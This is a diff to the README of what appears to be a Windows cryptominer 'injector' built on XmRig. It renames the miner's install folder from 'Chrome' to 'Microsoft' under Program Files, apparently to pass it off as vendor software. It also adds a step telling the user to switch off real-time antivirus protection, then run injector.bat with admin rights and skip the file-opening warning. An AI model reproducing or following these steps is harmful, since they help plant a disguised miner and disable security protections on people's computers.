@@ -16,9 +16,9 @@ To remove the miner from your computer, follow these steps:
 
 3. **Restart your computer.**
 
-4. **Remove the `Chrome` folder from `C:\Program Files`:**
+4. **Remove the `Microsoft` folder from `C:\Program Files`:**
    - Navigate to `C:\Program Files`.
-   - Delete the `Chrome` folder, which contains all the files related to the miner.
+   - Delete the `Microsoft` folder, which contains all the files related to the miner.
 
 By following these steps, you will remove the miner from your system.
 
@@ -36,5 +36,6 @@ For more information about XmRig, visit the [official XmRig GitHub repository](h
 ## How to Run the Program
 To run the program, follow these steps:
 
-1. Run the `injector.bat` file with admin privileges.
-2. Uncheck the "Always ask before opening this file" then run.
+1. Turn of `Real-time protection`, since it may interfere while downloading & extracting.
+2. Run the `injector.bat` file with admin privileges.
+3. Uncheck the "Always ask before opening this file" then run.
